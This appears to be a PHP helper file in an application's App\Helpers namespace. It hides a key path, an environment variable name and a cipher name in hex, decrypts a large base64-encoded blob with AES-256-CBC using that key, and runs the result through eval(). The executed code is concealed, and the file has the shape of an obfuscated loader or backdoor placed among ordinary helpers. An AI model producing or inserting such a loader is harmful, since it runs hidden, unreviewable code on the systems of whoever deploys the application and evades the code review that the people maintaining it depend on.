<?php
namespace App\Helpers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('xpGYRriuBiteGfky99f+NQ==');

$c=base64_decode(

'vZEgv+Fpq4/UmHmVx4vHqhI6RKKb3fF9rkADchIBJzBhcedk5utkd4wLDjqdCfy/6sIgMtMy/ab0' .
'CPdmmuybW5N51ekbqc3bmYZ7UoJtN+d4qEYvaH4R7vfl8g3EwaKquhNFL1M8tb1iefzkSeF0XFCJ' .
'JJEdTFtuS3nHPvq6oALDvEFlOde/5zU3zunKPVvWdhtKnO85TjjCrPl+POC9QVZ7GIDql+BaBF15' .
'pWGcf2vnSU+9gLGo58vPs2GREjQFC6lmm9w4K4ZBxmvnrd0F16vHy7yr5vy9TcoWH2nly+l3XZmL' .
'RTtmceaNaWxAY1/qKXufU44GLTl4FEdt/RfSy2LbsFO9MLGo8+fFIk9Tkgdf3xNqFCLfijabEzDW' .
'rkU4NSxsPNKkZODG5jejXMLQmkskPtldjLIXxHfWPqV2sQpuQmGJk78r+KQKoAnLrbVoSqmEQyn7' .
'ZhdUD/aQgwGbquSKA/BNb5nAOiy6bMV3HzR0dhcFhW6+tMD31avD5nelk6J/tQgRdfQFnjFkfOP6' .
'4dZF91KyMbNAZR2ud1T+gknFn94bf0BpgDeI6ly4LHnFlBgH6MrlzerkcIMrI7mpJhOxwlDZfW0L' .
'+5B+G+9cni4lnKQrCQbvzqFezMibCZ4mCOEwwAswykpshmJj7Su3ytaiHMZKquT/Am0AViA+h8gB' .
'q48rYuk8J/2u6V56Aeupdf59AkuPwzIy9ESfdzDse6fNrEogjpVfhDRpbnzCVKL+LrGlpdaaZT8n' .
'Tip8rdLCm2C1aZwtw8fD6jUayiqNhYbeTUCOFkl/E0ua9dbCNEr8sHaUfQrORFhHSIz5tKpmikAW' .
'wV1Qxd8F5SNhatv6cWVjX2mPfzjSw8/P9Wav2xDmi86yJi1CzJgqDB1PgqnbEq+0nSlXEyz+7say' .
'aoCejyLzPxzVIztJXiSX1yC0qSXlTASCf97bUbmhuuha7w0tAnYWTRL5TQFf1gt96Hkb6/4DY4OO' .
'7/yxy69hmNV4bp5vmnJyPv/XLbSkLp2x/MxIpZeuhmm9/Ztdi01LlfD/bKBqHsNlPKrpVt38GhNR' .
'9K2FbqKVGzg9CoZNafmphtOixdjxP1+4X6qcccnu2rRA6KX+1xI3XarU6VC2lgX/vPlFXuJHfn28' .
'zRZWjqm9R6DKVcdGfj1tsK3k0MQ9NgeJKs0RZIDWmgDw242hW8EER/FzDKNLIzD1kfKc6QbLapnw' .
'/MgjWNYkKQINdid2NT0zd99nc6935vvmaOqwRgQZPRbAJnKTdjuJsvtXWyd7p1yUGvRTRYYAUUic' .
'ZERRlUIiw4DJQS+BI1yEyVKezL2Bcv+l+8SnOemxs6qH90OmBGEMgemkyUI7RJQpyZXn3Jt57DUw' .
'vhl91m0TjXl03WIm1XTGjXVtawiBow/G6G3Asb6QLZQ+bLQqjCmf8NoZ/6pBJRy5IZMRWzOntTay' .
'NDIjcPr01eaLfrAC7YdJClp+0k5OEybSfH6UZ9+FAJmf6eq4TYsfKXct+12Kc0q/I2whgPgcu78P' .
'6+dg8BU1Dofv4T7+isbIs4F9u2AyAwl6gRbtYtQavwWMcMDM+4UmGak3Xh1LUv6x3bJWmXWYP21g' .
'xmr4RXZm52c2VF95QJJPkfP3MOqcUb/xKoM0xUaxY+TlRdYmipBCg8RDoubXywhmfXOb08+xLia2' .
'JLnJjeW0cFFptJ3dx6e9BLC5Oik3k88SBrWa7fB7ZOpr1DBPzDVgv+r0uJNxeNBSDBMUb3EFeNmp' .
'Y4SnqnLwd6Ehn4EEabeQhpKbRf7tGJr5JIHPQJR/4jchsAQJ5Xng8k+eZaaKXnJKNej47vWACAL4' .
'3QdRGKaekd/hxv/FFqnwRs3sEeeFm5AYV6DUp4rlU8KVH0p9iTP8HaWrHT+BUuH005/3E2tcPRt0' .
'PchrTc0sv2PJq6lplSEu6oRLUgW9tVLCvpoGgWTVzKibgEzXLw0Mk74Per2BHgul1lYF4Q4T3bgm' .
'vsXdOAWcBQKogFVYY723xUtrDRAsPOOwrHQwOBn23kgyMNPLfDO+Y0u0efU5HWUI4FMJXzNFBeRW' .
'nrgKG65o0B8fgigz3Fw1pveWtK0jQCdZSb5550WNjgrYcSQsnlA5KRvpAXM+1TPBOUZVdmSQMvip' .
'Ndfe4uobomzlp9+GKqbCrWMBRR39U3ajyyhWPnerHeygQHvwX30htwEsozG6s6mfX4RssRjphQEO' .
'IhAtyS0NkB8YwcMHBNF8+0tS2qErMRJUCUr+fAXdrD/2DHzOiX0Bg/7uJyWF9cp6y2N1kGaXwodH' .
'zXn5EZpIbVyjIWb7/edZWdGSJyyE+nwgLrOICp6AEJ6PP+xpOlmT4AhglhUh2I1aTBxQRVRxvxA1' .
'cJbV7WpGJSN4vNObhOEa99uc+Zuey+oZN3iOVI4q/dCx57L7EHtGtRu2qhB/wAC690cdlmv+3KiW' .
'dnC8SgrUcKUG7/PqVj6RyY8vm+ZGJyYFHW99RaRsLn9rXjNjv8JH+Zrahu/v0PsdEBOnN6Ckn2lM' .
'e53407pfzhmKV5DCZN/YEikcX6JjXm1ZwI0ZpV5NkvM5JTNgX4OAt8ktSQlW6hJ5htEChnS7pjCq' .
'PcI9A+mFaaX7+DP+ws+QwviLhDmPZmllTMiRzZw5/q9hAdFJzhfIphI3yDJFF59BPQ8irc6ym0D9' .
'VidJpi+9GWdd9wl/SFzue/VunBjuVhrHC1JyRfP/8b2CNGgPZFG2brN+WZ+7hxBrnlc9eMhrtX9d' .
'H47xuMhj6ify9l+RU7MZAHlu7dl4v5RQk53fl7YjoDzV+M0brnbbl+0L5JX9yEAPugdAVpBzBULQ' .
'UleV8es8ZxOq8TQAVcmVAGOQPABRTUQsbWPpbFjQcy6T64qwtGQ084zjRMd98BU2bsT/1UdS8HaC' .
'DpR9cjgPFXGTve4fU2wx2gZ2hoVugVnpZOjTr6pRpNd7Vfl5H5yFsaLjU4mZoUWOZA/KKE0bH+uv' .
'w9gn6/+KmWHkM1cujGM2Ewo='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

